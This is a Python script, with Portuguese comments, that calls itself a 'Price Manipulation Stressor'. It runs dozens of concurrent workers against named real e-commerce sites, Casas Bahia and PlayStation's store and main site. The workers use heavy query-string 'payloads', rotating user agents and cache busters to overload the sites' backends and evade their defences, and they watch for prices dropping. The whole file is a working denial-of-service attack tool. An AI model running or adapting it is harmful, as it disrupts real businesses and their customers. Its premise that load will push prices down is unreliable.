import asyncio
import aiohttp
import random
import time
import os
import gc
import sys
import json
import urllib.parse

# --- CONFIGURAÇÕES DE ALVOS ---
# Estrutura: URL Base + Lista de Payloads de Ataque (Query Strings)
# Os payloads são desenhados para forçar o backend a trabalhar pesado.

TARGETS = [
    {
        "name": "Casas Bahia (PS5)",
        "base_url": "https://www.casasbahia.com.br/ps5/b",
        # Payloads que forçam filtros de preço, ordenação e paginação pesada
        "payloads": [
            "?price_min=0&price_max=1&sort=price_asc&page_size=100&_cb={cb}",
            "?price_min=0&price_max=1&sort=price_desc&category=eletronicos&page_size=200&_cb={cb}",
            "?filter=price:0-1&sort=price_asc&include_out_of_stock=true&_cb={cb}",
            "?q=ps5&sort=price_asc&max_price=1&_cb={cb}"
        ]
    },
    {
        "name": "PlayStation Store (GTA VI)",
        "base_url": "https://store.playstation.com/pt-br/product/EP1004-PPSA01547_00-GTAVIULTIMATE001",
        # Ataque à API de produto e busca
        "payloads": [
            "?include=offers,variants,reviews&sort=price_asc&_cb={cb}",
            "?currency=BRL&region=BR&include=offers&_cb={cb}",
            "?filter=price:0-1&sort=price_asc&_cb={cb}",
            "?_cb={cb}&format=json&verbose=true"
        ]
    },
    {
        "name": "PlayStation.com (Main)",
        "base_url": "https://www.playstation.com/pt-br/",
        # Ataque à página principal com parâmetros de tracking e busca pesada
        "payloads": [
            "?q=ps5&sort=price_asc&_cb={cb}",
            "?category=consoles&sort=price_asc&_cb={cb}",
            "?_cb={cb}&utm_source=stressor&utm_medium=attack",
            "?search=ps5&filter=price:0-1&_cb={cb}"
        ]
    }
]

WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "20"))
TOTAL_WORKERS = WORKERS_PER_TARGET * len(TARGETS)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

class Stats:
    def __init__(self):
        self.requests = 0
        self.errors = 0
        self.start_time = time.time()
        self.last_price_seen = {}

    def get_rps(self):
        delta = time.time() - self.start_time
        return self.requests / delta if delta > 0 else 0

    def record_price(self, target_name, price):
        self.last_price_seen[target_name] = price

stats = Stats()
stop_event = asyncio.Event()

def extract_price_from_json(data):
    """
    Tenta extrair o preço de um JSON de resposta da API.
    Sites de e-commerce usam estruturas diferentes, então usamos heurísticas.
    """
    try:
        if isinstance(data, dict):
            # Procura por chaves comuns de preço
            for key in ['price', 'currentPrice', 'sellingPrice', 'amount', 'value']:
                if key in data:
                    val = data[key]
                    if isinstance(val, (int, float)):
                        return val
                    elif isinstance(val, dict):
                        # Se for um objeto, tenta pegar o 'amount' dentro
                        if 'amount' in val:
                            return val['amount']
                        if 'value' in val:
                            return val['value']
            
            # Procura em listas de ofertas
            if 'offers' in data and isinstance(data['offers'], list):
                for offer in data['offers']:
                    if isinstance(offer, dict):
                        if 'price' in offer:
                            return offer['price']
                        if 'priceSpecification' in offer:
                            return offer['priceSpecification'].get('price')
            
            # Recursão simples para JSONs aninhados
            for v in data.values():
                if isinstance(v, dict):
                    price = extract_price_from_json(v)
                    if price is not None:
                        return price
        return None
    except Exception:
        return None

async def safe_request(session, url, headers, target_name, worker_id):
    """
    Executa a requisição e tenta extrair o preço da resposta.
    """
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            # Leitura do corpo
            content = await resp.text(errors='ignore')
            stats.requests += 1
            
            if resp.status >= 400:
                stats.errors += 1
                return

            # Tenta extrair o preço
            price = None
            content_type = resp.headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                try:
                    data = json.loads(content)
                    price = extract_price_from_json(data)
                except json.JSONDecodeError:
                    pass
            
            # Se não foi JSON, tenta uma regex simples em HTML (fallback)
            if price is None:
                import re
                # Procura por padrões de preço em reais ou números
                match = re.search(r'\$?\s?(\d{1,5}(?:[.,]\d{1,2})?)', content)
                if match:
                    try:
                        price = float(match.group(1).replace('.', '').replace(',', '.'))
                    except:
                        pass

            if price is not None:
                stats.record_price(target_name, price)
                # Log opcional: Se o preço mudar, mostra nos logs
                # if target_name in stats.last_price_seen and stats.last_price_seen[target_name] != price:
                #     print(f"[PRICE-CHANGE] {target_name}: {stats.last_price_seen[target_name]} -> {price}")

    except Exception as e:
        stats.errors += 1
        if stats.errors % 50 == 0:
            print(f"[WARN] {target_name} | Worker {worker_id} erro: {type(e).__name__}")

async def attack_worker(session, target_config, worker_id):
    """
    Worker que ataca um alvo específico rotacionando payloads.
    """
    base_url = target_config['base_url']
    payloads = target_config['payloads']
    target_name = target_config['name']
    
    headers_base = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': base_url
    }
    
    payload_index = 0
    
    while not stop_event.is_set():
        try:
            headers = headers_base.copy()
            headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # Seleciona um payload aleatório para variar o ataque
            payload_template = payloads[payload_index % len(payloads)]
            payload_index += 1
            
            # Insere o cache buster
            cache_buster = random.randint(100000, 999999)
            url = base_url + payload_template.replace("{cb}", str(cache_buster))
            
            await safe_request(session, url, headers, target_name, worker_id)
            
            # Jitter assíncrono para evitar sincronização total dos workers
            await asyncio.sleep(random.uniform(0.01, 0.05))

        except asyncio.CancelledError:
            break
        except Exception as e:
            if not stop_event.is_set():
                print(f"[ERROR] {target_name} | Worker {worker_id} exceção: {e}")
                await asyncio.sleep(1)

async def monitor_stats():
    """
    Monitora estatísticas e memória.
    """
    while not stop_event.is_set():
        await asyncio.sleep(5)
        rps = stats.get_rps()
        uptime = int(time.time() - stats.start_time)
        h, r = divmod(uptime, 3600)
        m, s = divmod(r, 60)
        
        gc.collect()
        
        # Mostra os últimos preços vistos
        price_str = " | ".join([f"{k}: R${v:.2f}" for k, v in stats.last_price_seen.items()])
        
        print(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Req: {stats.requests} | Err: {stats.errors} | Preços: {price_str}")

async def main():
    print(f"[INIT] Iniciando Price Manipulation Stressor.")
    print(f"[INIT] Alvos: {len(TARGETS)}")
    print(f"[INIT] Workers por alvo: {WORKERS_PER_TARGET} (Total: {TOTAL_WORKERS})")
    
    connector = aiohttp.TCPConnector(
        limit=0, 
        limit_per_host=50, # Menor para e-commerce (WAFs mais agressivos)
        ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=20)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        worker_id = 0
        
        for target in TARGETS:
            for _ in range(WORKERS_PER_TARGET):
                tasks.append(asyncio.create_task(attack_worker(session, target, worker_id)))
                worker_id += 1
        
        monitor_task = asyncio.create_task(monitor_stats())
        
        print("[INIT] Ataque ativo. Monitorando preços...")
        
        try:
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            stop_event.set()
            monitor_task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            print("[EXIT] Processo encerrado.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[EXIT] Interrompido.")
    except Exception as e:
        print(f"[FATAL] Erro crítico: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
